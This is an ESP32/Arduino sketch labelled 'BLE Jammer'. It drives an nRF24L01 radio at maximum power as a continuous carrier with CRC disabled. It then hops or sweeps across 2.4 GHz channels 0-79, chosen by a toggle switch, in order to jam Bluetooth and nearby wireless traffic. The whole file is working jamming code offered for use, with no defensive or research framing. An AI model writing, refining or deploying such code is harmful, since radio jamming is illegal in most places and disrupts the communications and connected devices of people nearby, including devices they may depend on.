#include <SPI.h>
#include <RF24.h>

// Define nRF24L01 pinout
#define CE_PIN   5   // D1 (GPIO5)
#define CSN_PIN  4   // D2 (GPIO4)
#define BUTTON_PIN 33 // Pin for toggle switch (if applicable)

// Create RF24 object
RF24 radio(CE_PIN, CSN_PIN);
ezButton toggleSwitch(BUTTON_PIN);

// Channel settings
byte channel = 45;
unsigned int flag = 0;

void setup() {
  // Disable Bluetooth and Wi-Fi
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();

  Serial.begin(115200);
  toggleSwitch.setDebounceTime(50);
  initHP();
}

void initHP() {
  // Initialize the RF24 radio
  if (radio.begin()) {
    delay(200);
    Serial.println("BLE Jammer is Started !!!");
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);   // Set payload size
    radio.setAddressWidth(3);  // Set address width
    radio.setPALevel(RF24_PA_MAX, true);  // Maximum power level
    radio.setDataRate(RF24_2MBPS);  // High data rate
    radio.setCRCLength(RF24_CRC_DISABLED);  // Disable CRC
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, channel);  // Start continuous carrier signal
  } else {
    Serial.println("BLE Jammer couldn't be started !!!");
  }
}

void two() {
  // Channel hopping logic with 2 spacing
  if (flag == 0) {
    channel += 3;
  } else {
    channel -= 3;
  }

  if ((channel > 79) && (flag == 0)) {
    flag = 1;
  } else if ((channel < 2) && (flag == 1)) {
    flag = 0;
  }

  radio.setChannel(channel);
  Serial.println("Jamming Bluetooth channel: " + String(channel));
}

void one() {
  // Sweep through all channels
  for (int i = 0; i < 79; i++) {
    radio.setChannel(i);
    delay(10);  // Small delay for stability
    Serial.println("Sweeping Bluetooth channel: " + String(i));
  }
}

void loop() {
  toggleSwitch.loop();  // Call the loop function for the button state checking

  int state = toggleSwitch.getState();
  
  if (state == HIGH) {
    two();  // Execute channel hopping
  } else {
    one();  // Execute channel sweeping
  }
}
